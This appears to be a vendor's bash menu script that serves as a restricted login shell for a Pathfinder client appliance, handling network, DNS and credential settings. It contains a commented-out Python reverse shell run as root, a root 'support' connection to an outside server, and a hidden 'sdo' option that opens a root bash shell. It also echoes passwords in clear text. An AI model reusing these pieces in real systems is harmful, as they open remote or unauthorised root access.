#!/bin/bash
#
### BEGIN INIT INFO
# Provides:          meny shell
# Should-Start:      $named
# Default-Start:     2 3 4 5
# Default-Stop:      
# Short-Description: shell for limit user functionality
# Description:       shell for limit user functionality
#                    useradd  --shell /opt/shell/menu.sh  --create-home  --home-dir /home/user1 --comment "User1"  user1
#                    passwrd user1
#
#                    chsh -s /opt/shell/menu.sh admin
### END INIT INFO



txtbld=$(tput bold)             # Bold

bldred=${txtbld}$(tput setaf 1) #  red
bldgre=${txtbld}$(tput setaf 2) #  green
bldyll=${txtbld}$(tput setaf 3) #  yellow
bldblu=${txtbld}$(tput setaf 4) #  blue
bldwht=${txtbld}$(tput setaf 7) #  white

txtrst=$(tput sgr0)             # Reset

PROD="Cloudreach"
OWNER="Cloudreach"


show_menu(){
    NORMAL=`echo "\033[m"`
    MENU=`echo "\033[36m"` #Blue
    NUMBER=`echo "\033[33m"` #yellow
    FGRED=`echo "\033[41m"`
    RED_TEXT=`echo "\033[31m"`
    ENTER_LINE=`echo "\033[33m"`
    NOW=$(date +"%Y-%m-%d %H:%M:%S")
    echo -e "${MENU}*********************************************${NORMAL}"
    echo -e "${MENU}**            $PROD Menu              **${NORMAL}"
    echo -e "${MENU}*********** $NOW *************${NORMAL}"
    echo -e "${MENU}**${NUMBER} 1)${MENU} Pathfinder Client ${NORMAL}"
    echo -e "${MENU}**${NUMBER} 2)${MENU} Network Configuration ${NORMAL}"
    echo -e "${MENU}**${NUMBER} P)${MENU} Password change ${NORMAL}"
    echo -e "${MENU}**${NUMBER} R)${MENU} Reboot ${NORMAL}"
    echo -e "${MENU}**${RED_TEXT} x)${MENU} Exit ${NORMAL}"
    echo -e "${MENU}*********************************************${NORMAL}"
    echo -e "${ENTER_LINE}Please enter an option ${RED_TEXT}enter [x] to exit. ${NORMAL}"
    read opt
}

function option_picked() {
    COLOR="\033[31m" # bold red
    RESET="\033[m" # normal white
    MESSAGE=$(@:-"${RESET}Error: No message passed")
    echo -e "${COLOR}${MESSAGE}${RESET}"
}


function valid_ip()
{
    local  ip=$1
    local  stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 \
            && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}


function valid_ip_port()
{
    local  ip=$1
    local  stat=1
    
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{2,5}$ ]]; then
        return 0;
    else
        return 1;
    fi

}




show_menu_ip(){
    NORMAL=`echo "\033[m"`
    MENU=`echo "\033[36m"` #Blue
    NUMBER=`echo "\033[33m"` #yellow
    FGRED=`echo "\033[41m"`
    RED_TEXT=`echo "\033[31m"`
    ENTER_LINE=`echo "\033[33m"`
    
    NOW=$(date +"%Y-%m-%d %H:%M:%S")        
    echo -e "${MENU}*********************************************${NORMAL}"
    echo -e "${MENU}**          $PROD Network Menu        **${NORMAL}"
    echo -e "${MENU}************* $NOW ***********${NORMAL}"
    echo -e "${MENU}**${NUMBER} 1)${MENU} Set DHCP ${NORMAL}"
    echo -e "${MENU}**${NUMBER} 2)${MENU} Set Static IP ${NORMAL}"
    echo -e "${MENU}**${NUMBER} 3)${MENU} Get Current IP ${NORMAL}"
    echo -e "${MENU}**${NUMBER} 4)${MENU} Set DNS ${NORMAL}"
    echo -e "${MENU}**${NUMBER} 5)${MENU} Get DNS ${NORMAL}"
    echo -e "${MENU}**${NUMBER} P)${MENU} Ping Tool ${NORMAL}"
    echo -e "${MENU}**${NUMBER} T)${MENU} Test Network ${NORMAL}"
   # echo -e "${MENU}**${NUMBER} H)${MENU} Help to $OWNER ${NORMAL}"
    echo -e "${MENU}**${RED_TEXT} x)${MENU} Return Main Menu ${NORMAL}"
    echo -e "${MENU}*********************************************${NORMAL}"
    echo -e "${ENTER_LINE}Please enter an option ${RED_TEXT}enter [x] to exit. ${NORMAL}"
    read opt
}


pathfinder_menu(){
    NORMAL=`echo "\033[m"`
    MENU=`echo "\033[36m"` #Blue
    NUMBER=`echo "\033[33m"` #yellow
    FGRED=`echo "\033[41m"`
    RED_TEXT=`echo "\033[31m"`
    ENTER_LINE=`echo "\033[33m"`
    
    NOW=$(date +"%Y-%m-%d %H:%M:%S")        
    echo -e "${MENU}*********************************************${NORMAL}"
    echo -e "${MENU}**             PathFinder Menu             **${NORMAL}"
    echo -e "${MENU}************* $NOW ***********${NORMAL}"
    echo -e "${MENU}**${NUMBER} A)${MENU} Autoconfigure ${NORMAL}"
    echo -e "${MENU}**${NUMBER} 1)${MENU} Set Username ${NORMAL}"
    echo -e "${MENU}**${NUMBER} 2)${MENU} Set Server ${NORMAL}"
    echo -e "${MENU}**${NUMBER} R)${MENU} Restart Pathfinder Client ${NORMAL}"
    echo -e "${MENU}**${NUMBER} S)${MENU} Pathfinder Client Status ${NORMAL}"    
    echo -e "${MENU}**${NUMBER} L)${MENU} Show log ${NORMAL}"
    echo -e "${MENU}**${RED_TEXT} x)${MENU} Return Main Menu ${NORMAL}"
    echo -e "${MENU}*********************************************${NORMAL}"
    echo -e "${ENTER_LINE}Please enter an option ${RED_TEXT}enter [x] to exit. ${NORMAL}"
    read opt_pathfider
}

network_config(){
clear
show_menu_ip
while [ 1 ]
    do

    case $opt in

        
        1) clear;
        #echo -e "Set DHCP";
        set_dhcp_conf
        show_menu_ip;
        ;;

        2) clear;
            #echo -e "Set Static IP";
             config_static_ip
        show_menu_ip;
            ;;
            
        3) clear;
            CURR_IP=$(/sbin/ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
            echo -e  "Current IP is : $CURR_IP";
            show_menu_ip;
            ;; 
          
          
         4) clear;
            #echo -e "Set Static IP";
             config_dns
        show_menu_ip;
            ;;
            
            
         5) clear;
            CURR_DNS=$(/bin/cat /etc/resolv.conf )
            echo -e  "Current DNS is :";
            echo $CURR_DNS;
            show_menu_ip;
            ;;      
        [pP]) clear;
            network_ping
            echo -e  "";
            show_menu_ip;
            ;; 
            
         [tT]) clear;
            network_test
            echo -e  "";
            show_menu_ip;
            ;;    
            
        [hH]) clear;
            help_to_netalia
            
            echo -e  "";
            show_menu_ip;
            ;;              
            
        [xX]) clear;
            return;
            ;;                            


        *)clear;
        echo -e  "Pick an option from the menu";
        show_menu_ip;
        ;;
    esac

done




}


pathfinder_config(){
clear
pathfinder_menu
while [ 1 ]
    do

    case $opt_pathfider in
    
        [aA]) clear;
        #echo -e "Autoconfiguration";
        config_automatic
        pathfinder_menu;
        ;;
            
        1) clear;
        #echo -e "Set DHCP";
        config_username
        pathfinder_menu;
        ;;

        2) clear;
            #echo -e "Set Static IP";
             config_server
        pathfinder_menu;
            ;;
       
        [rR]) clear;
            echo -e "";
            sudo service pfc restart;
            echo -e "";
            pathfinder_menu;
        ;;

        [sS]) clear;
             echo -e "";
             sudo service pfc status;
             echo -e "";
             show_config_server;
             pathfinder_menu;
            ;;            
            
        [lL]) clear;
            #echo -e "Set Static IP";
            # sudo /usr/bin/tail -n 100 /home/pfc/nohup.out
            echo -e "-- START OF LOG FILE --\n";
             sudo /usr/bin/tail -n 100 /home/pfc/nohup.out  |  \
                sed -u -e 's/Authentication Failure!/\x1B\[31;1mAuthentication Failure!\x1B\[37;0m/' | \
                sed -u -e 's/Listening RAS on UDP port 1719/\x1B\[32;1mListening RAS on UDP port 1719\x1B\[37;0m/' | \
                sed -u -e 's/(\[.*\](.*) /\x1B\[34;1m[$1] $2\x1B\[37;0m/' | \
                sed -u -e 's/\[\(.*\)\]\(.*\)/\x1B\[33;1m[\1]\x1B\[34;1m\2\x1B\[37;0m/'
             echo -e "-- END OF LOG FILE --";
        pathfinder_menu;
            ;;
            
  
            
      
        [xX]) clear;
            return;
            ;;                


        *)clear;
        echo -e  "Pick an option from the menu";
        pathfinder_menu;
        ;;
    esac

done




}


function config_static_ip() {

while [ 1 ]
do
  echo -n "Enter your IP address and press [ENTER]: "
    read IP
    #echo -n "your ip $IP "
    if valid_ip $IP; then 
      break; 
    else 
      echo -n "Invalid IP address ";
      echo ""; 
    fi
done


while [ 1 ]
do
  echo -n "Enter your NETMASK address and press [ENTER]: "
    read MASK
    #echo -n "your ip $IP "
    if valid_ip $MASK; then 
      break; 
    else 
      echo -n "Invalid MASK address ";
      echo ""; 
    fi
done



while [ 1 ]
do
  echo -n "Enter your GATEWAY address and press [ENTER]: "
    read GATEWAY
    #echo -n "your ip $GATEWAY "
    if valid_ip $GATEWAY; then 
      break; 
    else 
      echo -n "Invalid GATEWAY address ";
      echo ""; 
    fi
done


while [ 1 ]
do    
echo "Network config : IP:$IP  MASK:$MASK  GW:$GATEWAY";
echo ""
echo  -n "Do you want to apply this configuration? [y/n]: "
read yno
  case $yno in
  
          [yY] | [yY][Ee][Ss] )
                  echo "Apply Static IP ..."
                  create_static_conf $IP $MASK $GATEWAY
                  return
                  ;;
  
          [nN] | [n|N][O|o] )
                  echo "Abort";
                  return
                  ;;
          *) echo "Invalid input"
              ;;
  esac
done    
    
}






function config_username() {

while [ 1 ]
do
  echo -n "Enter your Username and press [ENTER]: "
    read USER
    if [  -n $USER ]; then 
      break; 
    else 
      echo -n "Invalid User  ";
      echo ""; 
    fi
done

while [ 1 ]
do
  echo -n "Enter your Password and press [ENTER]: "
    read PASS
    if [  -n $PASS ]; then 
      break; 
    else 
      echo -n "Invalid PASS  ";
      echo ""; 
    fi
done



while [ 1 ]
do    
echo "Network config : USER:$USER  PASS:$PASS ";
echo ""
echo  -n "Do you want to apply this configuration? [y/n]: "
read yno
  case $yno in
  
          [yY] | [yY][Ee][Ss] )
                  echo "Apply USER ..."
                  CURR_IP=$(/sbin/ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
                  
                  sudo /bin/cp  /home/pfc/config.ini /tmp/config.ini
                  sudo /bin/chown admin  /tmp/config.ini
                  
                  sed -i "s/LocalAddress=.*/LocalAddress=$CURR_IP/"  /tmp/config.ini
                  sed -i "s/TCName=.*/TCName=$USER/"  /tmp/config.ini
                  sed -i "s/Password=.*/Password=$PASS/"  /tmp/config.ini

                  echo "$USER" | base64 >  /opt/shell/host.conf

                  sudo /bin/cp /tmp/config.ini /home/pfc/config.ini
                  sudo /bin/chown pfc  /tmp/config.ini
                  sudo /usr/sbin/service pfc restart
                  return
                  ;;
  
          [nN] | [n|N][O|o] )
                  echo "Abort";
                  return
                  ;;
          *) echo "Invalid input"
              ;;
  esac
done    
    
}



function network_ping(){

while [ 1 ]
do
  echo -n "Enter IP address and press [8.8.8.8]: "
    read IP_SRV
    #echo -n "your ip $DNS1 "
    if valid_ip $IP_SRV; then 
      break; 
    else 
      IP_SRV="8.8.8.8";
      break;  
    fi
done


echo -n "Ping IP: $IP_SRV :"
echo -en ' \t '
ping -c 2 -w 2 $IP_SRV > /tmp/ping.log
if [ $? -eq 0 ]; then
  echo "$bldgre OK $txtrst" 
else
  echo "$bldred FAILED $txtrst"
fi

echo ""; 
echo $(cat /tmp/ping.log | grep "received\|rtt" )
echo ""; 

}


function network_test(){

CURR_GW=$( /sbin/route -n | grep 'UG[ \t]' | awk '{print $2}' )
CURR_DNS=$( /bin/cat /etc/resolv.conf | grep nameserver | head -1  | awk {'print$2'} )


echo -n "Ping Gateway $CURR_GW :"
echo -en ' \t '
ping -c 2 -w 2 $CURR_GW > /dev/null
if [ $? -eq 0 ]; then
  echo "$bldgre OK $txtrst" 
else
  echo "$bldred FAILED $txtrst"
fi

echo -n "Ping DNS $CURR_DNS :"
echo -en ' \t '
ping -c 2 -w 2 $CURR_DNS > /dev/null
if [ $? -eq 0 ]; then
  echo "$bldgre OK $txtrst" 
else
  echo "$bldred FAILED $txtrst"
fi


SRV1_IP=$(sudo grep 'TSAddress=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
echo -n "Ping  Pathinder Server 1 :"
echo -en ' \t '
ping -c 2 -w 2 $SRV1_IP > /dev/null
if [ $? -eq 0 ]; then
  echo "$bldgre OK $txtrst" 

      SRV1_PT=$(sudo grep 'TSPort=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
      
      STAT=$(sudo /usr/bin/nmap -sS -p $SRV1_PT $SRV1_IP  | grep $SRV1_PT | head -1 | awk {'print$2'}  )
      echo -n "Check Pathinder Server 1 :"  
      echo -en ' \t '
      if [ "$STAT" = "open" ]; then
        echo "$bldgre $STAT $txtrst" 
      else
        echo "$bldred $STAT $txtrst"
      fi


else
  echo "$bldred FAILED $txtrst"
fi





}



function show_config_server() {


USER=$(sudo grep 'TCName=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
PASS=$(sudo grep 'Password=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV1_IP=$(sudo grep 'TSAddress=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV1_PT=$(sudo grep 'TSPort=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV2_IP=$(sudo grep 'AlternativeTSAddress1=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV2_PT=$(sudo grep 'AlternativeTSPort1=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV3_IP=$(sudo grep 'AlternativeTSAddress2=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV3_PT=$(sudo grep 'AlternativeTSPort2=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV4_IP=$(sudo grep 'AlternativeTSAddress3=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')
SRV4_PT=$(sudo  grep 'AlternativeTSPort3=' /home/pfc/config.ini  | awk -F= '{ print  $2 }')

CURR_IP=$(/sbin/ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
CURR_MC=$(/sbin/ifconfig -a | grep HWaddr | head -1 | awk {'print$5'})
HOSTID=$( /bin/cat /opt/shell/host.conf )


H323_PORT=$(sudo /usr/bin/nmap  -sS -p 1720 "$CURR_IP" | grep 1720/tcp )






echo " ";
echo "Username: $USER";
echo "Password: $PASS";
echo " ";
echo "Local IP : $CURR_IP";
echo "Local MAC: $CURR_MC";
echo "Local ID : $HOSTID"
echo " ";
echo "PORT: $H323_PORT";
echo " ";



echo "Server1: $SRV1_IP:$SRV1_PT ";
echo "Server2: $SRV2_IP:$SRV2_PT ";
echo "Server3: $SRV3_IP:$SRV3_PT ";
echo "Server4: $SRV4_IP:$SRV4_PT ";
echo " ";
echo " ";

echo "System Connection:";

if [ ! -z  $SRV1_IP ]; then
#  echo $(/bin/netstat -an | grep $SRV1_IP  | grep $SRV1_PT )

  for i in `netstat -n | grep "ESTABLISHED"  | grep $SRV1_IP  | grep $SRV1_PT  `; do
   x=$((x + 1))
    if [ $x == 5 ]; then
     if [[ $i != *'127.0'* ]] ; then
      echo " >> $i"
     fi
  elif [ $x == 6 ]; then
     x="0"
   fi
  done
 
fi


if [ ! -z  $SRV2_IP ]; then
  for i in `netstat -n | grep "ESTABLISHED"  | grep $SRV2_IP  | grep $SRV2_PT  `; do
   x=$((x + 1))
    if [ $x == 5 ]; then
     if [[ $i != *'127.0'* ]] ; then
      echo " >> $i"
     fi
  elif [ $x == 6 ]; then
     x="0"
   fi
  done
fi
if [ ! -z  $SRV3_IP ]; then
  for i in `netstat -n | grep "ESTABLISHED"  | grep $SRV3_IP  | grep $SRV3_PT  `; do
   x=$((x + 1))
    if [ $x == 5 ]; then
     if [[ $i != *'127.0'* ]] ; then
      echo " >> $i"
     fi
  elif [ $x == 6 ]; then
     x="0"
   fi
  done
fi
if [ ! -z  $SRV4_IP ]; then
  for i in `netstat -n | grep "ESTABLISHED"  | grep $SRV4_IP  | grep $SRV4_PT  `; do
   x=$((x + 1))
    if [ $x == 5 ]; then
     if [[ $i != *'127.0'* ]] ; then
      echo " >> $i"
     fi
  elif [ $x == 6 ]; then
     x="0"
   fi
  done
fi


echo " ";
echo " ";


}


function help_to_netalia(){

while [ 1 ]
do    

echo  -n "Do you use default setting? [Y/n]: "
read yno
  case $yno in
  
          [nN] | [n|N][O|o] )
          
                  while [ 1 ]
                  do
                    echo  "Enter Help Server "
                    echo -n "es: 37.72.32.10  and press [Required][ENTER]:"
                      read IP_HELP
                      #echo -n "your ip $SRV1 "
                      if valid_ip $IP_HELP; then 
                        break; 
                      else 
                        echo -n "Invalid IP address es: xxx.xxx.xxx.xxxx ";
                        echo ""; 
                      fi
                  done
                  
                  while [ 1 ]
                  do
                    echo  "Enter Help Server Port "
                    echo -n "es: 443  and press [Required][ENTER]:"
                      read PT_HELP
                      #echo -n "your ip $SRV1 "
                      if [ PT_HELP =~ ^[0-9]{2,4}$ ]; then 
                        break; 
                      else 
                        echo -n "Invalid port: [0-9]{2,4} ";
                        echo ""; 
                      fi
                  done
                  break;
                  
                  ;;
          *)      
             IP_HELP="";
             PT_HELP="";
             break;
              ;;
  esac
done

#sudo -u root python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP_HELP',$PT_HELP));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);";
clear
echo  "      .:: Netalia Support ::.";
echo  " Non Riavviare la macchina. Grazie";

sudo -u root python   /opt/shell/help_connection.py  $IP_HELP   $PT_HELP
 return 
}

function config_server() {



while [ 1 ]
do
  echo  "Enter Server n.1  "
  echo -n "es: 37.72.32.10:3089  and press [Required][ENTER]:"
    read SRV1
    #echo -n "your ip $SRV1 "
    if valid_ip_port $SRV1; then 
      break; 
    else 
      echo -n "Invalid IP address es: xxx.xxx.xxx.xxxx:zzzz ";
      echo ""; 
    fi
done


while [ 1 ]
do
  echo  "Enter Server n.2  "
  echo -n "es: 37.72.32.11:3089  and press [Optional][ENTER]:"
    read SRV2
    #echo -n "your ip $SRV1 "
    if [  -z  $SRV2 ]; then 
      echo  "no Srv2 set";
      break; 
    else
      if valid_ip_port $SRV2; then 
        break; 
      else 
        echo -n "Invalid IP address es: xxx.xxx.xxx.xxxx:zzzz ";
        echo ""; 
      fi      
    fi
done

while [ 1 ]
do
  echo  "Enter Server n.3  "
  echo -n "es: 37.72.32.11:3089  and press [Optional][ENTER]:"
    read SRV3
    #echo -n "your ip $SRV1 "
    if [  -z  $SRV3 ]; then 
      echo  "no Srv3 set";
      break; 
    else
      if valid_ip_port $SRV3; then 
        break; 
      else 
        echo -n "Invalid IP address es: xxx.xxx.xxx.xxxx:zzzz ";
        echo ""; 
      fi      
    fi
done


while [ 1 ]
do
  echo  "Enter Server n.4  "
  echo -n "es: 37.72.32.11:3089  and press [Optional][ENTER]:"
    read SRV4
    #echo -n "your ip $SRV1 "
    if [  -z  $SRV4 ]; then 
      echo  "no Srv4 set";
      break; 
    else
      if valid_ip_port $SRV4; then 
        break; 
      else 
        echo -n "Invalid IP address es: xxx.xxx.xxx.xxxx:zzzz ";
        echo ""; 
      fi      
    fi
done









while [ 1 ]
do    
echo "Network config : Server1:$SRV1 Server2:$SRV2 Server3:$SRV3 Server4:$SRV4";
echo ""
echo  -n "Do you want to apply this configuration? [y/n]: "
read yno
  case $yno in
  
          [yY] | [yY][Ee][Ss] )
                  echo "Apply Server ..."
                  CURR_IP=$(/sbin/ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
                  
                  sudo /bin/cp  /home/pfc/config.ini /tmp/config.ini
                  sudo /bin/chown admin  /tmp/config.ini
                  CURR_IP=$(/sbin/ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
                  sed -i "s/LocalAddress=.*/LocalAddress=$CURR_IP/"  /tmp/config.ini
                  
                  
                  SRV1_ARRAY=(`echo $SRV1 | tr ":" "\n"`)
                  sed -i "s/TSAddress=.*/TSAddress=${SRV1_ARRAY[0]} /"  /tmp/config.ini
                  sed -i "s/TSPort=.*/TSPort=${SRV1_ARRAY[1]}/"  /tmp/config.ini
                  
                  SRV2_ARRAY=(`echo $SRV2 | tr ":" "\n"`)
                  sed -i "s/AlternativeTSAddress1=.*/AlternativeTSAddress1=${SRV2_ARRAY[0]} /"  /tmp/config.ini
                  sed -i "s/AlternativeTSPort1=.*/AlternativeTSPort1=${SRV2_ARRAY[1]}/"  /tmp/config.ini

                  SRV3_ARRAY=(`echo $SRV3 | tr ":" "\n"`)
                  sed -i "s/AlternativeTSAddress2=.*/AlternativeTSAddress2=${SRV3_ARRAY[0]} /"  /tmp/config.ini
                  sed -i "s/AlternativeTSPort2=.*/AlternativeTSPort2=${SRV3_ARRAY[1]}/"  /tmp/config.ini
                  
                  
                  SRV4_ARRAY=(`echo $SRV4 | tr ":" "\n"`)
                  sed -i "s/AlternativeTSAddress3=.*/AlternativeTSAddress3=${SRV4_ARRAY[0]} /"  /tmp/config.ini
                  sed -i "s/AlternativeTSPort3=.*/AlternativeTSPort3=${SRV4_ARRAY[1]}/"  /tmp/config.ini

                  sudo /bin/cp /tmp/config.ini /home/pfc/config.ini
                  sudo /bin/chown pfc  /tmp/config.ini
                  sudo /usr/sbin/service pfc restart
                  return
                  ;;
  
          [nN] | [n|N][O|o] )
                  echo "Abort";
                  return
                  ;;
          *) echo "Invalid input"
              ;;
  esac
done    
    
}

function config_automatic(){

HOST="www.netalia.it"
HOSTID=$( /bin/cat /opt/shell/host.conf )
echo "Request configuration for ID:$HOSTID"
SERVERS=$(wget "http://$HOST/pfc_autoconfig.php?request=server&hostid=$HOSTID" -q -O -)
#echo $SERVERS
SRVs_ARRAY=(`echo $SERVERS | tr ";" "\n"`)
  #echo "${SRVs_ARRAY[0]}" 
  SRV1_ARRAY=(`echo ${SRVs_ARRAY[0]} | tr ":" "\n"`)
  SRV1="${SRV1_ARRAY[0]}"
  SRV1_PT="${SRV1_ARRAY[1]}"
  
  SRV2_ARRAY=(`echo ${SRVs_ARRAY[1]} | tr ":" "\n"`)
  SRV2="${SRV2_ARRAY[0]}"
  SRV2_PT="${SRV2_ARRAY[1]}"
  
  SRV3_ARRAY=(`echo ${SRVs_ARRAY[2]} | tr ":" "\n"`)
  SRV3="${SRV3_ARRAY[0]}"
  SRV3_PT="${SRV3_ARRAY[1]}"
  
  
  SRV4_ARRAY=(`echo ${SRVs_ARRAY[3]} | tr ":" "\n"`)
  SRV4="${SRV4_ARRAY[0]}"
  SRV4_PT="${SRV4_ARRAY[1]}"    
  
  
SUPPORT=$(wget "http://$HOST/pfc_autoconfig.php?request=support&hostid=$HOSTID" -q -O -)
echo $SUPPORT >  /opt/shell/support.conf


USERs=$(wget "http://$HOST/pfc_autoconfig.php?request=username&hostid=$HOSTID" -q -O -)
USER_ARRAY=(`echo $USERs | tr ":" "\n"`)    
  USER="${USER_ARRAY[0]}"
  PASS="${USER_ARRAY[1]}"    

echo "User    config : USER:$USER  PASS:$PASS ";
echo "Network config : Server1:$SRV1 Server2:$SRV2 Server3:$SRV3 Server4:$SRV4";
if [ -z $SRV1 ]; then 
    echo -n "General Error ";
     return; 
fi

 echo "Apply Server ..."
                  CURR_IP=$(/sbin/ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
                  
                  sudo /bin/cp  /home/pfc/config.ini /tmp/config.ini
                  sudo /bin/chown admin  /tmp/config.ini
                  
                  CURR_IP=$(/sbin/ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
                  sed -i "s/LocalAddress=.*/LocalAddress=$CURR_IP/"  /tmp/config.ini
                  
                  sed -i "s/TCName=.*/TCName=$USER/"  /tmp/config.ini
                  sed -i "s/Password=.*/Password=$PASS/"  /tmp/config.ini

                  sed -i "s/TSAddress=.*/TSAddress=$SRV1 /"  /tmp/config.ini
                  sed -i "s/TSPort=.*/TSPort=$SRV1_PT/"  /tmp/config.ini
                  
                  sed -i "s/AlternativeTSAddress1=.*/AlternativeTSAddress1=$SRV2 /"  /tmp/config.ini
                  sed -i "s/AlternativeTSPort1=.*/AlternativeTSPort1=$SRV2_PT/"  /tmp/config.ini
                  
                  sed -i "s/AlternativeTSAddress2=.*/AlternativeTSAddress2=$SRV3 /"  /tmp/config.ini
                  sed -i "s/AlternativeTSPort2=.*/AlternativeTSPort2=$SRV3_PT/"  /tmp/config.ini
                  
                  sed -i "s/AlternativeTSAddress3=.*/AlternativeTSAddress3=$SRV4 /"  /tmp/config.ini
                  sed -i "s/AlternativeTSPort3=.*/AlternativeTSPort3=$SRV4_PT/"  /tmp/config.ini


                  sudo /bin/cp /tmp/config.ini /home/pfc/config.ini
                  sudo /bin/chown pfc  /tmp/config.ini
                  sudo /usr/sbin/service pfc restart
}


function config_dns() {

while [ 1 ]
do
  echo -n "Enter your DNS 1 address and press [ENTER]: "
    read DNS1
    #echo -n "your ip $DNS1 "
    if valid_ip $DNS1; then 
      break; 
    else 
      echo -n "Invalid DNS1 address ";
      echo ""; 
    fi
done


while [ 1 ]
do
  echo -n "Enter your DNS 2 address and press [ENTER]: "
    read DNS2
    #echo -n "your ip $DNS2 "
    if valid_ip $DNS2; then 
      break; 
    else 
      echo -n "Invalid DNS2 address ";
      echo ""; 
    fi
done



while [ 1 ]
do    
echo "Network config : DNS1:$DNS1  DNS2:$DNS2";
echo ""
echo  -n "Do you want to apply this configuration? [y/n]: "
read yno
  case $yno in
  
          [yY] | [yY][Ee][Ss] )
                  echo "Apply DNS ..."
                  set_dns $DNS1 $DNS2
                  return
                  ;;
  
          [nN] | [n|N][O|o] )
                  echo "Abort";
                  return
                  ;;
          *) echo "Invalid input"
              ;;
  esac
done    
    
}


create_static_conf (){


echo "auto lo" > /tmp/interfaces
echo "iface lo inet loopback  " >> /tmp/interfaces
echo "" >> /tmp/interfaces
echo "auto eth0" >> /tmp/interfaces
echo "allow-hotplug eth0" >> /tmp/interfaces
echo "iface eth0 inet static" >> /tmp/interfaces
echo "    address $1" >> /tmp/interfaces
echo "    netmask $2" >> /tmp/interfaces
echo "    gateway $3" >> /tmp/interfaces

sudo /bin/cp /tmp/interfaces /etc/network/interfaces
sudo /usr/sbin/service networking restart

}

set_dhcp_conf (){

echo "auto lo" > /tmp/interfaces
echo "iface lo inet loopback  " >> /tmp/interfaces
echo "" >> /tmp/interfaces
echo "auto eth0" >> /tmp/interfaces
echo "allow-hotplug eth0" >> /tmp/interfaces
echo "iface eth0 inet dhcp" >> /tmp/interfaces

sudo /bin/cp /tmp/interfaces /etc/network/interfaces
sudo /usr/sbin/service networking restart

}


set_dns (){

echo "nameserver $1" > /tmp/resolv.conf
echo "nameserver $2" >> /tmp/resolv.conf


sudo /bin/cp /tmp/resolv.conf /etc/resolv.conf
#sudo /usr/sbin/service networking restart

}



clear
show_menu
while [ 1 ]
    do

    case $opt in
       

      #  3) clear;

      #      sudo service apache2 restart;
      #      echo -e "";
      #      show_menu;
      #      ;;

        1) clear;
            pathfinder_config
            echo -e "";
            show_menu;
            ;;
            
        2) clear;
            network_config
            echo -e "";
            show_menu;
            ;;
            
        [rR]) clear;
            RED_TEXT=`echo "\033[31m"`
            YLL_TEXT=`echo "\033[33m"` #yellow
            NORMAL=`echo "\033[m"`
            echo "";
            echo "";
            echo  -en "${RED_TEXT} Do you want to ${YLL_TEXT}Reboot${RED_TEXT} ? [y/n]:${NORMAL} "
            read yno
              case $yno in
  
                    [yY] | [yY][Ee][Ss] )
                            echo "Rebooting....."
                            sudo /sbin/shutdown -r now
                            sleep 3;
                            exit;
                            ;;
            
                    [nN] | [n|N][O|o] )
                            echo "Abort";
                            show_menu;
                            ;;
                    *) echo "Invalid input"
                    show_menu;                    
                        ;;
            esac
            
            ;;            
              
         [pP]) clear;
            sudo /usr/bin/passwd admin
            show_menu
            ;; 
            
         sdo) clear;
            sudo /bin/bash
            
            ;;                                    
            
        x) clear;
           exit;
            ;;            



        *)clear;
      
        echo -e " Pick an option from the menu";
        show_menu;
        ;;
    esac

done